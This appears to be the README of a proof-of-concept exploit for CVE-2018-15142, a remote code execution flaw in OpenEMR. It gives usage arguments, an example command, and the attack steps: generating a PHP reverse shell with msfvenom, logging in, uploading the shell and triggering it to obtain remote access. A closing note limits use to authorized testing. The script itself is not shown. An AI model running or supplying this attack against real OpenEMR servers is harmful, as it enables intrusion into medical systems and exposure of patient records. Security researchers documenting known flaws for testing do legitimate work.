## Description
This script is a proof of concept (PoC) for exploiting the CVE-2018-15142 vulnerability in OpenEMR. The vulnerability allows for Remote Code Execution (RCE), which can be used to execute arbitrary code on the server.

## Requirements
- Python 3.x
- `msfvenom` (part of the Metasploit framework for generating payloads)

## Usage
The script runs from the command line and requires certain parameters to function correctly. Below are the steps for its execution:

## Arguments
- `-t`, `--target`: Domain of the OpenEMR installation (required).
- `--ssl`: Use HTTPS instead of HTTP.
- `--user`: Username for authentication (required).
- `--password`: Password for authentication (required).
- `--lhost`: Local host for the reverse shell (required).
- `--lport`: Local port for the reverse shell (required).

## Example Command
```shell
python exploit.py -t example.com --ssl --user admin --password admin123 --lhost 192.168.1.10 --lport 4444
```

## Script Functionality
- Generate Reverse Shell: The script uses msfvenom to generate a PHP reverse shell payload.
- Authentication: The script authenticates to the OpenEMR system using the provided credentials.
- Upload Shell: The script uploads the generated reverse shell to the server.
- Execute Shell: The script triggers the execution of the reverse shell, providing remote access.

## Notes
This script is a proof of concept and should only be used for educational purposes and in controlled environments where explicit permission to perform security testing has been obtained. Misuse of this script on unauthorized systems may be illegal and is strictly prohibited.
